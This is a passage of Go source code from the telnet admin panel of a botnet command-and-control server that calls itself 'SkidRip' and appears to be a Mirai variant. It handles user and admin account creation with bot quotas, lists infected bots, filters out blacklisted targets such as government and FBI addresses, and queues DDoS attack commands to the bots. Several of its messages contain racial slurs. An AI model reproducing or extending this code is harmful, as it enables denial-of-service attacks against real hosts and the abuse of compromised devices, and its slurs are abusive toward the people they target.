            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩╩\033[0m \r\n"))
            time.Sleep(250 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═╦╔╦╗\033[31m\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗║ ║║\033[31m\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩╩═╩╝\033[31m\033[0m \r\n"))
            time.Sleep(250 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═╦╔╦╗\033[31m╦═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗║ ║║\033[31m╠╦╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩╩═╩╝\033[31m╩╚═\033[0m \r\n"))
            time.Sleep(250 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═╦╔╦╗\033[31m╦═╗╦\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗║ ║║\033[31m╠╦╝║\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩╩═╩╝\033[31m╩╚═╩\033[0m \r\n")) 
            time.Sleep(250 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═╦╔╦╗\033[31m╦═╗╦╔═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗║ ║║\033[31m╠╦╝║╠═╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩╩═╩╝\033[31m╩╚═╩╩  \033[0m \r\n")) 
            time.Sleep(250 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═╦╔╦╗\033[31m╦═╗╦╔═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗║ ║║\033[31m╠╦╝║╠═╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩╩═╩╝\033[31m╩╚═╩╩  \033[0m \r\n")) 
            this.conn.Write([]byte("\033[31m              \033[0m \r\n"))
            this.conn.Write([]byte("\033[31m[SkidRip] API Attack Sent on "+ HOST + " For "+ TIME +" Using "+ METHOD +" On Port " + PORT + "\033[0m \r\n"))       
            this.conn.Write([]byte("\033[31m              \033[0m \r\n"))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[31m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;31mResults\x1b[1;31m: \r\n\x1b[1;31m" + locformatted + "\x1b[0m\r\n"))

        }
        
if strings.Contains(cmd, "@") {
            this.conn.Write([]byte("\033[31m\033[31mCrash Attempt Logged!\033[0m\r\n"))
            continue
        }

        if strings.HasPrefix(cmd, "-") {
            this.conn.Write([]byte("\033[31m\033[31mCrash Attempt Logged!\033[0m\r\n"))
            continue
        }

        if strings.HasSuffix(cmd, "=") {
            this.conn.Write([]byte("\033[31m\033[31mInvalid Flag!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "/") {
            this.conn.Write([]byte("\033[31m\033[31mAttempt Logged!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, ",") {
            this.conn.Write([]byte("\033[31m\033[31mOne Attack At A Time!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "1.1.1.1") {
            this.conn.Write([]byte("\033[31m\033[31mRlly Nigga\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "8.8.8.8") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, ".ca") {
            this.conn.Write([]byte("\033[31m\033[31mNo Hitting Gov\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, ".us") {
            this.conn.Write([]byte("\033[31m\033[31mNo Hitting Gov\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, ".uk") {
            this.conn.Write([]byte("\033[31m\033[31mNo Hitting Gov\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, ".au") {
            this.conn.Write([]byte("\033[31m\033[31mNo Hitting Gov\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, ".gov") {
            this.conn.Write([]byte("\033[31m\033[31mNo Hitting Gov\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "nfoservers.com") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "64.94.238.13") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "216.52.148.4") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "66.150.214.8") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "31.186.250.100") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "153.31.113.27") {
            this.conn.Write([]byte("\033[31m\033[31m Nigga why do you want to hit the fbi\033[0m\r\n"))
        }

        if strings.Contains(cmd, "66.150.188.101") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "63.251.20.100") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "66.151.138.9") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "192.223.25.100") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "103.95.221.2") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "103.95.221.83") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "117.27.239.28") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "103.95.221.88") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "103.95.221.84") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "103.95.221.8") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "103.95.221.7") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "103.95.221.75") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "109.201.148.62") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "75.75.75.75") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "dstat") {
            this.conn.Write([]byte("\033[31m\033[31mThis Host Is Blacklisted!\033[0m\r\n"))
            continue
        }

        if strings.Contains(cmd, "pornhub") {
            this.conn.Write([]byte("\033[31m\033[31mLets Think About This...\033[0m\r\n"))
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "addbasic" {
            this.conn.Write([]byte("\033[0mBasic User's Name ->\033[1;31m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mPassword:\033[1;31m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBotcount\033[31m\033[0m:\033[1;31m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAttack Duration\033[1;31m\033[0m:\033[1;31m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mCooldown\033[31m\033[0m:\033[31m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New User's info - \r\n- Username - \033[1;31m" + new_un + "\r\n\033[0m- Password - \033[1;31m" + new_pw + "\r\n\033[0m- Bots - \033[1;31m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[1;31m" + duration_str + "\r\n\033[0m- Cooldown - \033[1;31m" + cooldown_str + "   \r\n\033[0mContinue? \033[1;31m(\033[01;32my\033[1;31m/\033[01;97mn\033[1;31m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32mUser added successfully.\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "REMOVEUSER" || cmd == "removeuser" {
            this.conn.Write([]byte("\x1b[1;0mUsername: \x1b[0m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \x1b[1;0mAre You Sure You Want To Remove \033[0m" + rm_un + "\x1b[1;0m?(y/n): \x1b[0m"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[0mUnable to Remove User\r\n")))
            } else {
                this.conn.Write([]byte("\x1b[1;0mUser Successfully Removed!\r\n"))
            }
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "addadmin" {
            this.conn.Write([]byte("\x1b[0mUsername:\x1b[31m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[0mPassword:\x1b[31m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[0mBotcount:\x1b[31m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[0mAttack Duration:\x1b[31m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[0mCooldown:\x1b[31m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to parse the Cooldown")))
                continue
            }
            this.conn.Write([]byte("- New User Info - \r\n- Username - " + new_un + "\r\n\033[0m- Password - " + new_pw + "\r\n\033[0m- Bots - " + max_bots_str + "\r\n\033[0m- Max Duration - " + duration_str + "\r\n\033[0m- Cooldown - " + cooldown_str + "   \r\n\x1b[0mmContinue? (y/n):\x1b[31m "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", "Failed to Create New User. Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[0mmAdmin Added Successfully!\033[0m\r\n"))
            }
            continue
        }

        if cmd == "BOTS" || cmd == "bots" {
        botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("                                \033[0m%s \x1b[0m[\033[0m%d\x1b[0m]\r\n\033[0m", k, v)))
            }
            this.conn.Write([]byte(fmt.Sprintf("\033[0m                                Total \x1b[0m[\033[0m%d\x1b[0m]\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[0mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[0mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    this.conn.Write([]byte("\033[31m[\033[0mSkidRip\033[31m] 🚀 \033[0mAttack Has Been Launched \033[31m🚀\r\n"))
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 999999)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
